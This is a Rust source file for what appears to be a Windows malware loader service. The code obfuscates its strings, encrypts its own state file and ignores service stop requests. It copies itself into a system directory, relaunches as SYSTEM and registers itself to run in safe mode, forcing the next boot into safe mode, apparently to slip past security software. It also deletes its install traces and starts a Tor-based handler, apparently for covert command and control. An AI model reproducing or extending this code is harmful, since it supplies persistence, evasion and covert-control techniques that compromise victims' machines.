use crate::network::utils::run_config;
use crate::safemode::utils::{
    is_safe_mode,
    register_seclogon_for_safemode,
    register_self_for_safemode,
    safemode_fail_safe,
    set_next_boot_safemode,
};
use serde::{ Deserialize, Serialize };
use shared::utils::encryption::{ convert_key_to_bytes, sauron_decrypt, sauron_encrypt };
use crate::network::tor::LdrTrHandler;
use crate::service::utils::SERVICE_TYPE;
use crate::{ err, info, tag, warn };
use anyhow::{ Context, Result };
use loader_vars::constants::{
    loader_service_name,
    loader_version,
    system_log_directory,
    system_service_directory,
};
use loader_vars::types::receive::RnCnfgPrms;
use obfstr::obfstr as s;
use shared::constants::{
    configs_encryption_key,
    get_initial_install_dir,
    get_loader_install_lock_dir,
    logs_encryption_key,
    system_loader_exe_name,
};
use shared::network::tor::LoggerCnfg;
use shared::utils::config::{ load_mib_config, write_mib_config, HstCnfg };
use shared::utils::functions::{
    exit_1_insta,
    get_current_exe,
    get_current_exe_dir,
    is_running_from_system32,
    try_spawn_program_as_system,
};
use std::fs::{ create_dir_all, remove_dir_all };
use std::thread::sleep;
use std::{ ffi::OsString, thread, time::Duration };
use windows_service::{
    define_windows_service,
    service::{ ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus },
    service_control_handler::{ self, ServiceControlHandlerResult },
    service_dispatcher,
};

pub fn start_service() -> Result<()> {
    service_dispatcher
        ::start(loader_service_name(), ffi_service_main)
        .context(s!("Failed to start service dispatcher").to_string())?;

    Ok(())
}

define_windows_service!(ffi_service_main, my_service_main);

pub fn my_service_main(_arguments: Vec<OsString>) {
    if let Err(error) = service_runner() {
        err!("Service Errored out: ", error);
    }
}

fn service_runner() -> Result<()> {
    // let (shutdown_tx, _shutdown_rx) = mpsc::channel();

    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            ServiceControl::Stop => {
                // shutdown disabled
                // warn!("Service received stop event, exiting");
                // setup some sort of cleaning if needed make sure

                // shutdown_tx
                //     .send(())
                //     .unwrap_or_else(|e| err!("Failed to send shutdown signal: ", e));
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    let status_handle = service_control_handler
        ::register(loader_service_name(), event_handler)
        .context(s!("Failed to register service control handler").to_string())?;

    status_handle
        .set_service_status(ServiceStatus {
            service_type: SERVICE_TYPE,
            current_state: ServiceState::Running,
            controls_accepted: ServiceControlAccept::STOP,
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: Duration::default(),
            process_id: None,
        })
        .context(s!("Failed to set service as running").to_string())?;

    info!("Service start");

    let is_running_from_system32 = is_running_from_system32();
    let mib_config = load_mib_config(false)?;
    let is_safe_mode = is_safe_mode();

    if !mib_config.cln_up_done && !is_safe_mode {
        if let Err(error) = pre_cleanup() {
            err!("pre_cleanup error: ", error);
        }
    }

    if !mib_config.cln_up_done && is_safe_mode {
        if let Err(error) = launch_cleanup() {
            err!("launch_cleanup error: ", error);
        }
    }

    if mib_config.cln_up_done && !is_running_from_system32 {
        if let Err(error) = post_cleanup() {
            err!("Post cleanup error: ", error);
        }
        exit_1_insta();
    }

    if mib_config.cln_up_done && is_running_from_system32 {
        if let Err(error) = system_service_work() {
            err!("system_service_work error: ", error);
        }
    }
    info!("Service end");

    status_handle
        .set_service_status(ServiceStatus {
            service_type: SERVICE_TYPE,
            current_state: ServiceState::Stopped,
            controls_accepted: ServiceControlAccept::empty(),
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: Duration::default(),
            process_id: None,
        })
        .context(s!("Failed to set service as stopped").to_string())?;

    Ok(())
}

fn pre_cleanup() -> Result<()> {
    tag!("PRE-CLEANUP");
    if let Ok(cache_config) = loader_cache_config() {
        match cache_config.st {
            LdrSt::NonRegd => {
                info!("NonRegd -> BlnkRegd");
                write_loader_cache_config(&(CfgLdr { st: LdrSt::BlnkRegd }))?;
            }
            LdrSt::BlnkRegd => {
                info!("BlnkRegd -> SclRegd");
                register_seclogon_for_safemode()?;
                write_loader_cache_config(&(CfgLdr { st: LdrSt::SclRegd }))?;
            }
            LdrSt::SclRegd => {
                info!("SclRegd -> SlfRegd");

                register_self_for_safemode()?;
                write_loader_cache_config(&(CfgLdr { st: LdrSt::SlfRegd }))?;
            }
            LdrSt::SlfRegd => {
                info!("SlfRegd -> SfbRegd");

                set_next_boot_safemode()?;
                write_loader_cache_config(&(CfgLdr { st: LdrSt::SfbRegd }))?;
            }
            LdrSt::SfbRegd => {
                info!("SfbRegd");
            }
        }
    }

    Ok(())
}

fn launch_cleanup() -> Result<()> {
    tag!("LAUNCH-CLEANUP");
    if
        let Err(error) = try_spawn_program_as_system(
            get_current_exe().to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
            None
        )
    {
        err!("spawn_program_as_system Error: ", error);
        safemode_fail_safe();
    } else {
        let fail_safe_thread = thread::spawn(move || {
            let fail_safe_seconds = 8;
            thread::sleep(Duration::from_secs(fail_safe_seconds));
            warn!("FAIL SAFE TIMEOUT");
            safemode_fail_safe();
        });
        let _ = fail_safe_thread.join();
    }
    Ok(())
}

fn post_cleanup() -> Result<()> {
    tag!("POST-CLEANUP");

    // delete the cmstp cleanup - name Network

    create_dir_all(system_service_directory())?;
    let system_exe = system_service_directory().join(system_loader_exe_name());
    std::fs::copy(get_current_exe(), &system_exe)?;
    let cache_path = system_service_directory().join(s!("cache.cfg"));
    std::fs::write(&cache_path, "")?;
    let mut mib_config = load_mib_config(true)?;
    mib_config.ldrs.push(HstCnfg {
        version: loader_version(),
        folder_path: system_service_directory()
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_string(),
        exe_path: system_exe
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_string(),
        config_path: cache_path
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_string(),
    });
    write_mib_config(&mib_config)?;
    // then we just run it, and exit - if it fails we auto restart next boot
    try_spawn_program_as_system(
        system_exe.to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
        None
    )?;

    Ok(())
}

fn system_service_work() -> Result<()> {
    tag!("SYSTEM-SERVICE-WORK");
    let initial_install_dir = get_initial_install_dir();
    if initial_install_dir.exists() && initial_install_dir.is_dir() {
        if let Err(error) = remove_dir_all(initial_install_dir) {
            err!("remove_dir_all on initial_install_dir Error: ", error);
        }
    }
    let loader_install_lock_dir = get_loader_install_lock_dir();
    if !loader_install_lock_dir.exists() || !loader_install_lock_dir.is_dir() {
        if let Err(error) = create_dir_all(loader_install_lock_dir) {
            err!("create_dir_all on loader_install_lock_dir Error: ", error);
        }
    }
    info!("run config pre tor handler");

    // always run default - if theres already installed - we just run the apps, if higher versions also run those

    if let Err(error) = run_config(RnCnfgPrms::default(), false) {
        err!("run_config(RnCnfgPrms::default()) Error: ", error);
    }

    info!("run config done");
    tokio::runtime::Builder
        ::new_multi_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(async move {
            if let Ok(mut handler) = LdrTrHandler::new().await {
                handler.run_handler().await;
            }
        });
    Ok(())
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum LdrSt {
    NonRegd,
    BlnkRegd,
    SclRegd,
    SlfRegd,
    SfbRegd,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CfgLdr {
    pub st: LdrSt,
}
impl Default for CfgLdr {
    fn default() -> Self {
        Self {
            st: LdrSt::NonRegd,
        }
    }
}
pub fn loader_cache_config() -> Result<CfgLdr> {
    let file_path = get_current_exe_dir().join(s!("cache.cfg"));

    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());

    if let Ok(data) = std::fs::read(file_path.clone()) {
        if let Ok(decrypted_data) = sauron_decrypt(enc_key_bytes, &data) {
            if let Ok(cnfg) = serde_json::from_slice(&decrypted_data) {
                return Ok(cnfg);
            }
        }
    }

    let default_cache = CfgLdr::default();

    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(&default_cache)?)?;

    std::fs::write(file_path, encrypted_data)?;

    Ok(default_cache)
}

pub fn write_loader_cache_config(config: &CfgLdr) -> Result<()> {
    let file_path = get_current_exe_dir().join(s!("cache.cfg"));
    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());
    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(config)?)?;
    std::fs::write(file_path, encrypted_data)?;
    Ok(())
}
